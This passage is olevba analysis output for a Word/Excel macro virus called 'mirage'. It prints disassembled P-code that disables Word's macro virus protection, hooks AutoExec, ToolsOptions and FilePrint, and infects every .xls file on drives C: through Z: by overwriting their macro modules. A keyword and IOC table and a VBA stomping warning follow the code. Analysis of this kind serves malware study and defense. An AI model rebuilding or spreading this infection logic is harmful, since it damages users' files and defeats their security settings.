' 	IfBlock 
' Line #222:
' 	LitStr 0x0006 "mirage"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "mirage"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #223:
' 	Label qw 
' 	ArgsLd Rnd 0x0000 
' 	LitDI4 0x7693 0x0001 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St rn 
' Line #224:
' 	LitStr 0x0006 "WINDIR"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0008 "\SYSTEM\"
' 	Concat 
' 	Ld rn 
' 	Concat 
' 	LitStr 0x0004 ".sys"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #225:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "Attribute VB_Name = "
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0006 "mirage"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #226:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "Sub ViewVBcode()"
' 	PrintItemNL 
' Line #227:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #228:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Sub AutoExec()"
' 	PrintItemNL 
' Line #229:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "Options.VirusProtection = 0"
' 	PrintItemNL 
' Line #230:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "V = Second(Now())"
' 	PrintItemNL 
' Line #231:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0041 "Application.OnTime Now + TimeValue("00:" & (V) & ":00"), "InfXls""
' 	PrintItemNL 
' Line #232:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #233:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "Sub ToolsOptions()"
' 	PrintItemNL 
' Line #234:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "Options.VirusProtection = 1"
' 	PrintItemNL 
' Line #235:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002A "If Dialogs(wdDialogToolsOptions).Show Then"
' 	PrintItemNL 
' Line #236:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "End If"
' 	PrintItemNL 
' Line #237:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "Options.VirusProtection = 0"
' 	PrintItemNL 
' Line #238:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #239:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	PrintItemNL 
' Line #240:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #241:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "Sub Organizer()"
' 	PrintItemNL 
' Line #242:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #243:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Sub AutoExit()"
' 	PrintItemNL 
' Line #244:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "Application.ScreenUpdating = 0"
' 	PrintItemNL 
' Line #245:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "Options.VirusProtection = 1"
' 	PrintItemNL 
' Line #246:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #247:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "Sub InfXls()"
' 	PrintItemNL 
' Line #248:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "On Error Resume Next"
' 	PrintItemNL 
' Line #249:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "Set fs = Application.FileSearch"
' 	PrintItemNL 
' Line #250:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x009A "fs.LookIn = "C:\ ; D:\ ; E:\ ; F:\ ; G:\ ; H:\ ; I:\ ; J:\ ; K:\ ; L:\ ; M:\ ; N:\ ; O:\ ; P:\ ; Q:\ ; R:\ ; S:\ ; T:\ ; U:\ ; V:\ ; W:\ ; X:\ ; Y:\ ; Z:\"
' 	PrintItemNL 
' Line #251:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "fs.SearchSubFolders = True"
' 	PrintItemNL 
' Line #252:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "fs.FileName = "*.xls""
' 	PrintItemNL 
' Line #253:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "fs.Execute"
' 	PrintItemNL 
' Line #254:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "For z = 1 To fs.FoundFiles.Count"
' 	PrintItemNL 
' Line #255:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "SetAttr fs.FoundFiles(z), 0"
' 	PrintItemNL 
' Line #256:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0089 "DD = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)"
' 	PrintItemNL 
' Line #257:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002B "Set XLS = CreateObject("Excel.Application")"
' 	PrintItemNL 
' Line #258:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0030 "Set qwert = XLS.Workbooks.Open(fs.FoundFiles(z))"
' 	PrintItemNL 
' Line #259:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0050 "If qwert.VBProject.VBComponents.Item(1).CodeModule.Lines(3, 1) <> "mirage:" Then"
' 	PrintItemNL 
' Line #260:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0034 "With qwert.VBProject.VBComponents.Item(1).CodeModule"
' 	PrintItemNL 
' Line #261:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0030 ".DeleteLines 1, .CountOfLines: .AddFromString DD"
' 	PrintItemNL 
' Line #262:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "End With"
' 	PrintItemNL 
' Line #263:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "qwert.Save"
' 	PrintItemNL 
' Line #264:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "End If"
' 	PrintItemNL 
' Line #265:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "qwert.Close"
' 	PrintItemNL 
' Line #266:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "Next z"
' 	PrintItemNL 
' Line #267:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "XLS.Quit"
' 	PrintItemNL 
' Line #268:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #269:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "Sub FilePrint()"
' 	PrintItemNL 
' Line #270:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "On Error Resume Next"
' 	PrintItemNL 
' Line #271:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002C "If Dialogs(wdDialogFilePrint).Show = -1 Then"
' 	PrintItemNL 
' Line #272:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "Call InfXls"
' 	PrintItemNL 
' Line #273:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "End If"
' 	PrintItemNL 
' Line #274:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #275:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #276:
' 	LitStr 0x0006 "WINDIR"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0008 "\SYSTEM\"
' 	Concat 
' 	Ld rn 
' 	Concat 
' 	LitStr 0x0004 ".sys"
' 	Concat 
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall import 0x0001 
' Line #277:
' 	LitStr 0x0006 "WINDIR"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0008 "\SYSTEM\"
' 	Concat 
' 	Ld rn 
' 	Concat 
' 	LitStr 0x0004 ".sys"
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #278:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #279:
' 	EndIfBlock 
' Line #280:
' 	EndSub 
' Line #281:
' 	QuoteRem 0x0000 0x0000 ""
' Line #282:
' 	QuoteRem 0x0000 0x003A "               MMM            MMMMMMMMM                 MM"
' Line #283:
' 	QuoteRem 0x0000 0x003A "             MMMMMMMM     MMMMMMMMMMMMMMMM          MMMMMM"
' Line #284:
' 	QuoteRem 0x0000 0x003B "              MMMMMMMMMMMMMMM/"""""""\MMMMMMMMMMMMMMMMMMMMM"
' Line #285:
' 	QuoteRem 0x0000 0x003B "               MMMMMMMMMMMMMM\______/MMMMMMMMMMMMMMMMMMMMMM"
' Line #286:
' 	QuoteRem 0x0000 0x003C "               MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
' Line #287:
' 	QuoteRem 0x0000 0x003C "               MMMM      MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
' Line #288:
' 	QuoteRem 0x0000 0x003C "               MMM        MMMMMMMMMMMMM           MMMMMMMMMM"
' Line #289:
' 	QuoteRem 0x0000 0x003C "               MMM        MMMMMMMMMMM    RUSSIA     MMMMMMMM"
' Line #290:
' 	QuoteRem 0x0000 0x003C "                MM         MMMMMMMM               M  MMMMMMM"
' Line #291:
' 	QuoteRem 0x0000 0x003C "                MM        MMMMMMMMM             MMM   MMMMMM"
' Line #292:
' 	QuoteRem 0x0000 0x003C "                         MMMMMMMMMMMMMM      MMMMM    MMMMMM"
' Line #293:
' 	QuoteRem 0x0000 0x003B "                MM      MMMMMMMMMMMMMMMMMMMMMMMM       MMMM"
' Line #294:
' 	QuoteRem 0x0000 0x003B "               MMMMMMMMMMMMMMMMMMMMMMMMMMMMM           MMMM"
' Line #295:
' 	QuoteRem 0x0000 0x003A "              MMMMMMMMMM                                MM"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |mirage.vbs          |Executable file name                         |
|IOC       |virus.scr           |Executable file name                         |
|IOC       |virus.bat           |Executable file name                         |
|IOC       |Autorun.inf         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

